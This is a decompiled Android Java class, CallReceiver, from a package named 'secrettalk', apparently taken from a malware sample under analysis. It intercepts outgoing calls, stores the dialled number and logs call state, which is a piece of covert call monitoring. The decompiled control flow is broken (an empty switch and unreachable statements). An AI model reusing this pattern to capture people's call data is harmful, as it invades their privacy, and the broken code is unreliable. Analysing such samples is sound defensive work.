package com.android.secrettalk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import java.io.PrintStream;

public class CallReceiver
  extends BroadcastReceiver
{
  private static final String INTENT_PHONE_NUMBER = "android.intent.extra.PHONE_NUMBER";
  private static final String IN_ACTION = "android.intent.action.PHONE_STATE";
  private static final String OUTGOING_CALL_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
  String outCall = "";
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (paramIntent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL"))
    {
      this.outCall = paramIntent.getStringExtra("android.intent.extra.PHONE_NUMBER");
      TelephonyManager localTelephonyManager = (TelephonyManager)GlobalData.getInstance().getContext().getSystemService("phone");
      System.out.println("[PHONE STATE:] " + localTelephonyManager.getCallState());
      switch (localTelephonyManager.getCallState())
      {
      }
    }
    for (;;)
    {
      return;
      paramIntent.getAction().equals("android.intent.action.PHONE_STATE");
      break;
    }
  }
}


/* Location:           D:\Workspaces\SsSDK\contest_dev\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.CallReceiver
 * JD-Core Version:    0.7.0.1
 */